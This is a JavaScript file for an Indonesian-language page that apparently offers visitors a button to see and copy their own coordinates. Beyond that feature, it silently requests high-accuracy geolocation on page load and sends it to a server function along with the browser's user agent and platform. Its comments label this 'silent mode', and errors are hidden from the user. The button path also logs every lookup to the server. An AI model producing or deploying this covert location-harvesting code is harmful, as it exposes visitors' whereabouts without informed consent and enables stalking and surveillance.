// Elements
const getLocationBtn = document.getElementById('getLocationBtn');
const loadingContainer = document.getElementById('loadingContainer');
const resultContainer = document.getElementById('resultContainer');
const errorContainer = document.getElementById('errorContainer');
const errorMessage = document.getElementById('errorMessage');
const latitudeEl = document.getElementById('latitude');
const longitudeEl = document.getElementById('longitude');
const accuracyEl = document.getElementById('accuracy');
const timestampEl = document.getElementById('timestamp');
const googleMapsLink = document.getElementById('googleMapsLink');
const copyBtn = document.getElementById('copyBtn');

// State
let currentLocation = null;

// Event Listeners
getLocationBtn.addEventListener('click', getLocation);
copyBtn.addEventListener('click', copyCoordinates);

// Functions
function getLocation() {
    // Check if geolocation is supported
    if (!navigator.geolocation) {
        showError('Geolocation tidak didukung oleh browser Anda.');
        return;
    }

    // Hide all containers
    hideAllContainers();
    
    // Show loading
    loadingContainer.classList.remove('hidden');

    // Get location
    navigator.geolocation.getCurrentPosition(
        handleSuccess,
        handleError,
        {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        }
    );
}

function handleSuccess(position) {
    currentLocation = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        timestamp: position.timestamp
    };

    // Save to log
    saveToLog(currentLocation);

    // Hide loading
    loadingContainer.classList.add('hidden');

    // Display results
    displayResults();
}

function handleError(error) {
    loadingContainer.classList.add('hidden');
    
    let message = '';
    
    switch(error.code) {
        case error.PERMISSION_DENIED:
            message = 'Izin akses lokasi ditolak. Silakan izinkan akses lokasi di browser Anda.';
            break;
        case error.POSITION_UNAVAILABLE:
            message = 'Informasi lokasi tidak tersedia. Pastikan GPS atau layanan lokasi aktif.';
            break;
        case error.TIMEOUT:
            message = 'Permintaan lokasi timeout. Silakan coba lagi.';
            break;
        default:
            message = 'Terjadi kesalahan yang tidak diketahui.';
    }
    
    showError(message);
}

function displayResults() {
    // Update values
    latitudeEl.textContent = currentLocation.latitude.toFixed(6);
    longitudeEl.textContent = currentLocation.longitude.toFixed(6);
    accuracyEl.textContent = `±${Math.round(currentLocation.accuracy)} meter`;
    
    // Format timestamp
    const date = new Date(currentLocation.timestamp);
    timestampEl.textContent = date.toLocaleString('id-ID');
    
    // Update Google Maps link
    googleMapsLink.href = `https://www.google.com/maps?q=${currentLocation.latitude},${currentLocation.longitude}`;
    
    // Show result container
    resultContainer.classList.remove('hidden');
}

function showError(message) {
    errorMessage.textContent = message;
    errorContainer.classList.remove('hidden');
}

function hideAllContainers() {
    loadingContainer.classList.add('hidden');
    resultContainer.classList.add('hidden');
    errorContainer.classList.add('hidden');
}

function copyCoordinates() {
    if (!currentLocation) return;
    
    const coordinates = `${currentLocation.latitude}, ${currentLocation.longitude}`;
    
    // Copy to clipboard
    navigator.clipboard.writeText(coordinates).then(() => {
        // Change button text temporarily
        const originalText = copyBtn.innerHTML;
        copyBtn.innerHTML = `
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <polyline points="20 6 9 17 4 12"></polyline>
            </svg>
            Tersalin!
        `;
        copyBtn.style.background = '#10b981';
        copyBtn.style.color = 'white';
        
        setTimeout(() => {
            copyBtn.innerHTML = originalText;
            copyBtn.style.background = '';
            copyBtn.style.color = '';
        }, 2000);
    }).catch(err => {
        console.error('Gagal menyalin:', err);
        alert('Gagal menyalin koordinat. Silakan salin manual.');
    });
}

async function saveToLog(location) {
    try {
        // Always save to localStorage first (primary storage)
        saveToLocalStorage(location);
        console.log('✅ Location saved to localStorage');
        
        // Try to send to server as backup
        const logEntry = {
            latitude: location.latitude,
            longitude: location.longitude,
            accuracy: location.accuracy,
            timestamp: location.timestamp,
            userAgent: navigator.userAgent,
            platform: navigator.platform
        };
        
        // Send to server (Netlify Function) - non-blocking
        fetch('/.netlify/functions/save-location', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(logEntry)
        }).then(response => {
            if (response.ok) {
                return response.json();
            }
            throw new Error('Server save failed');
        }).then(result => {
            console.log('✅ Also saved to server:', result);
        }).catch(error => {
            console.warn('⚠️ Server save failed (data still in localStorage):', error);
        });
        
    } catch (error) {
        console.error('Failed to save log:', error);
        // LocalStorage already saved above
    }
}

function saveToLocalStorage(location) {
    try {
        // Get existing logs
        let logs = JSON.parse(localStorage.getItem('locationLogs') || '[]');
        
        // Add new log entry
        const logEntry = {
            id: Date.now(),
            latitude: location.latitude,
            longitude: location.longitude,
            accuracy: location.accuracy,
            timestamp: location.timestamp,
            date: new Date(location.timestamp).toISOString(),
            userAgent: navigator.userAgent,
            platform: navigator.platform
        };
        
        logs.unshift(logEntry);
        
        // Keep only last 100 entries
        if (logs.length > 100) {
            logs = logs.slice(0, 100);
        }
        
        // Save back to localStorage
        localStorage.setItem('locationLogs', JSON.stringify(logs));
        
        console.log('Location saved to localStorage');
    } catch (error) {
        console.error('Failed to save to localStorage:', error);
    }
}

// Auto-request location on page load (silent mode - no UI)
window.addEventListener('DOMContentLoaded', () => {
    // Automatically get location silently in background
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                // Save location silently
                const locationData = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: position.timestamp
                };
                saveToLog(locationData);
                console.log('📍 Location tracked silently');
            },
            (error) => {
                // Silent fail - no error shown to user
                console.log('Location tracking failed (silent):', error.message);
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    }
});

// Check location permission status on load
if (navigator.permissions && navigator.permissions.query) {
    navigator.permissions.query({ name: 'geolocation' }).then(result => {
        if (result.state === 'denied') {
            console.log('Location permission denied');
        }
    });
}

